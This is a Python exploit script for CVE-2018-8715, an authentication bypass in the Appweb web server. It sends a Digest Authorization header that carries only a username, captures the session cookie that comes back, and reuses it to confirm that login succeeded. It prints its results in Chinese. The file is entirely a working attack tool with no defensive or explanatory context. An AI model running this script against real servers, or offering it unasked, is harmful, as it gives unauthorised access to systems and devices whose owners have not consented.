"""
CVE-2018-8715EXP
Help:
python3 CVE-2018-8715POC.py url user
"""

import requests
import sys


def take(url):
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36",
        "Authorization": "Digest username=" + user
    }
    response = requests.post(url, headers=headers)
    if (response.status_code == 200):
        session = response.headers['Set-Cookie'].split(";")[0]
        return session
    else:
        print("Sorry , No CVE-2018-8715!")


def out(session):
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36",
        "Cookie": session
    }
    response = requests.post(url, headers=headers)
    if (response.status_code == 200):
        print("登陆成功")
    else:
        print("登陆失败")


if __name__ == '__main__':
    print("Userage: python appweb.py http://192.168.0.11:8080/")
    url = sys.argv[1]
    user = sys.argv[2]
    session = take(url)
    out(session)
